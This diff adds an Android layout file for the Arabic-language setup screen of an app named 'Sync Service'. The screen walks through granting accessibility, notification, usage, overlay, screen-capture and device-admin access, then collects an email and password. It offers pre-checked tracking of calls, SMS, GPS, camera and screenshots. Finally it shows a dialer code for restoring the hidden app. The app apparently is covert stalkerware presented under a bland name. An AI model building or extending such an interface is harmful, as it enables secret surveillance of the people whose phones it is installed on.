@@ -1,0 +1,319 @@
+<?xml version="1.0" encoding="utf-8"?>
+<androidx.coordinatorlayout.widget.CoordinatorLayout xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:app="http://schemas.android.com/apk/res-auto"
+    xmlns:tools="http://schemas.android.com/tools"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="#F8FAFC">
+
+    <com.google.android.material.appbar.AppBarLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:background="#0F172A">
+
+        <com.google.android.material.appbar.MaterialToolbar
+            android:id="@+id/toolbar"
+            android:layout_width="match_parent"
+            android:layout_height="?attr/actionBarSize"
+            app:title="إعداد Sync Service"
+            app:titleTextColor="#FFFFFF" />
+    </com.google.android.material.appbar.AppBarLayout>
+
+    <androidx.core.widget.NestedScrollView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        app:layout_behavior="@string/appbar_scrolling_view_behavior">
+
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="vertical"
+            android:padding="20dp">
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:text="مرحباً بك في خدمة المزامنة"
+                android:textColor="#1E293B"
+                android:textSize="20sp"
+                android:textStyle="bold" />
+
+            <TextView
+                android:layout_width="wrap_content"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="8dp"
+                android:layout_marginBottom="24dp"
+                android:text="يرجى إكمال خطوات الإعداد لضمان عمل التطبيق بشكل صحيح تماماً"
+                android:textColor="#64748B"
+                android:textSize="14sp" />
+
+            <!-- Checklist Section -->
+            <LinearLayout
+                android:id="@+id/permissionList"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical">
+
+                <!-- 1. Basic Permissions -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepBasic" />
+
+                <!-- 2. Notification Access -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepNotifications" />
+
+                <!-- 3. Accessibility Service -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepAccessibility" />
+
+                <!-- 4. Usage Data -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepUsage" />
+
+                <!-- 5. Overlay Permission -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepOverlay" />
+
+                <!-- 6. Battery Optimization -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepBattery" />
+                
+                <!-- 7. Screen Capture (NEW) -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepProjection" />
+
+                <!-- 8. Admin (Optional) -->
+                <include layout="@layout/item_setup_step" android:id="@+id/stepAdmin" />
+            </LinearLayout>
+
+            <!-- Account Activation Section (Initially Hidden) -->
+            <LinearLayout
+                android:id="@+id/accountSection"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:visibility="gone">
+
+                <View android:layout_width="match_parent" android:layout_height="1dp" android:background="#E2E8F0" android:layout_marginVertical="24dp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="تفعيل الحساب"
+                    android:textColor="#1E293B"
+                    android:textSize="18sp"
+                    android:textStyle="bold" />
+
+                <com.google.android.material.textfield.TextInputLayout
+                    style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="16dp"
+                    app:hintTextColor="#1E293B"
+                    android:hint="البريد الإلكتروني (Email)">
+                    <com.google.android.material.textfield.TextInputEditText
+                        android:id="@+id/etEmail"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:textColor="#0F172A"
+                        android:inputType="textEmailAddress" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+                <com.google.android.material.textfield.TextInputLayout
+                    style="@style/Widget.MaterialComponents.TextInputLayout.OutlinedBox"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="12dp"
+                    app:hintTextColor="#1E293B"
+                    android:hint="كلمة المرور (Password)">
+                    <com.google.android.material.textfield.TextInputEditText
+                        android:id="@+id/etPassword"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:textColor="#0F172A"
+                        android:inputType="textPassword" />
+                </com.google.android.material.textfield.TextInputLayout>
+
+                <Button
+                    android:id="@+id/btnActivate"
+                    android:layout_width="match_parent"
+                    android:layout_height="60dp"
+                    android:layout_marginTop="20dp"
+                    android:backgroundTint="#2563EB"
+                    android:text="تفعيل الخدمة (ACTIVATE)"
+                    android:textAllCaps="false"
+                    android:textSize="16sp"
+                    android:textStyle="bold"
+                    app:cornerRadius="16dp" />
+            </LinearLayout>
+
+            <!-- Activity Selection (New) -->
+            <LinearLayout
+                android:id="@+id/activitiesSection"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:orientation="vertical"
+                android:visibility="gone">
+
+                <View android:layout_width="match_parent" android:layout_height="1dp" android:background="#E2E8F0" android:layout_marginVertical="24dp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="اختر الأنشطة المراد تتبعها"
+                    android:textColor="#1E293B"
+                    android:textSize="18sp"
+                    android:textStyle="bold" />
+
+                <CheckBox android:id="@+id/cbCalls" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="سجل المكالمات (Calls)" android:textColor="#1E293B" android:buttonTint="#2563EB" android:checked="true" />
+                <CheckBox android:id="@+id/cbSms" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="الرسائل النصية (SMS)" android:textColor="#1E293B" android:buttonTint="#2563EB" android:checked="true" />
+                <CheckBox android:id="@+id/cbLocation" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="الموقع الجغرافي (GPS)" android:textColor="#1E293B" android:buttonTint="#2563EB" android:checked="true" />
+                <CheckBox android:id="@+id/cbCamera" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="صور الكاميرا (Camera)" android:textColor="#1E293B" android:buttonTint="#2563EB" android:checked="true" />
+                <CheckBox android:id="@+id/cbScreenshots" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="لقطات الشاشة (Screenshots)" android:textColor="#1E293B" android:buttonTint="#2563EB" android:checked="true" />
+
+                <Button
+                    android:id="@+id/btnConfirmActivities"
+                    android:layout_width="match_parent"
+                    android:layout_height="60dp"
+                    android:layout_marginTop="24dp"
+                    android:backgroundTint="#0F172A"
+                    android:text="تأكيد والبدء"
+                    android:textSize="16sp"
+                    android:textStyle="bold"
+                    app:cornerRadius="16dp" />
+            </LinearLayout>
+
+            <!-- PIN Display (Final Step) -->
+            <LinearLayout
+                android:id="@+id/pinSection"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:gravity="center"
+                android:orientation="vertical"
+                android:visibility="gone">
+
+                <View android:layout_width="match_parent" android:layout_height="1dp" android:background="#E2E8F0" android:layout_marginVertical="24dp" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="تم الإعداد بنجاح!"
+                    android:textColor="#10B981"
+                    android:textSize="22sp"
+                    android:textStyle="bold" />
+
+                <TextView
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="12dp"
+                    android:gravity="center"
+                    android:text="استخدم هذا الكود لاستعادة التطبيق من لوحة الاتصال:"
+                    android:textColor="#64748B" />
+
+                <TextView
+                    android:id="@+id/tvPinCode"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="8dp"
+                    android:text="*#1356365508#"
+                    android:textColor="#1E293B"
+                    android:textSize="32sp"
+                    android:textStyle="bold" />
+
+                <Button
+                    android:id="@+id/btnFinish"
+                    android:layout_width="match_parent"
+                    android:layout_height="60dp"
+                    android:layout_marginTop="32dp"
+                    android:backgroundTint="#0F172A"
+                    android:text="إنهاء التثبيت (Finish)"
+                    app:cornerRadius="12dp" />
+            </LinearLayout>
+
+            <!-- ─── بطاقة تحديث التطبيق ─────────────────────────────── -->
+            <com.google.android.material.card.MaterialCardView
+                android:id="@+id/cardUpdate"
+                android:layout_width="match_parent"
+                android:layout_height="wrap_content"
+                android:layout_marginTop="24dp"
+                app:cardCornerRadius="16dp"
+                app:cardElevation="4dp"
+                app:strokeColor="#6366F1"
+                app:strokeWidth="1dp"
+                app:cardBackgroundColor="#F5F3FF">
+
+                <LinearLayout
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:orientation="vertical"
+                    android:padding="20dp">
+
+                    <!-- Header -->
+                    <LinearLayout
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:gravity="center_vertical"
+                        android:orientation="horizontal">
+
+                        <TextView
+                            android:layout_width="0dp"
+                            android:layout_height="wrap_content"
+                            android:layout_weight="1"
+                            android:text="🚀 تحديث التطبيق"
+                            android:textColor="#3730A3"
+                            android:textSize="16sp"
+                            android:textStyle="bold" />
+
+                        <TextView
+                            android:id="@+id/tvCurrentVersion"
+                            android:layout_width="wrap_content"
+                            android:layout_height="wrap_content"
+                            android:background="#E0E7FF"
+                            android:paddingHorizontal="10dp"
+                            android:paddingVertical="4dp"
+                            android:text="v1"
+                            android:textColor="#4338CA"
+                            android:textSize="12sp"
+                            android:textStyle="bold" />
+                    </LinearLayout>
+
+                    <!-- Status -->
+                    <TextView
+                        android:id="@+id/tvUpdateStatus"
+                        android:layout_width="wrap_content"
+                        android:layout_height="wrap_content"
+                        android:layout_marginTop="8dp"
+                        android:text="اضغط للتحقق من وجود تحديث جديد"
+                        android:textColor="#6366F1"
+                        android:textSize="13sp" />
+
+                    <!-- Progress Bar -->
+                    <com.google.android.material.progressindicator.LinearProgressIndicator
+                        android:id="@+id/updateProgressBar"
+                        android:layout_width="match_parent"
+                        android:layout_height="wrap_content"
+                        android:layout_marginTop="12dp"
+                        android:visibility="gone"
+                        app:indicatorColor="#6366F1"
+                        app:trackColor="#E0E7FF"
+                        app:trackThickness="6dp"
+                        android:indeterminate="true" />
+
+                    <!-- Button -->
+                    <Button
+                        android:id="@+id/btnCheckUpdate"
+                        android:layout_width="match_parent"
+                        android:layout_height="52dp"
+                        android:layout_marginTop="16dp"
+                        android:backgroundTint="#6366F1"
+                        android:text="التحقق من التحديثات"
+                        android:textAllCaps="false"
+                        android:textColor="#FFFFFF"
+                        android:textSize="15sp"
+                        android:textStyle="bold"
+                        app:cornerRadius="12dp"
+                        app:icon="@android:drawable/stat_sys_download"
+                        app:iconGravity="textStart"
+                        app:iconTint="#FFFFFF" />
+
+                </LinearLayout>
+            </com.google.android.material.card.MaterialCardView>
+
+            <View android:layout_width="match_parent" android:layout_height="100dp" />
+        </LinearLayout>
+    </androidx.core.widget.NestedScrollView>
+
+</androidx.coordinatorlayout.widget.CoordinatorLayout>
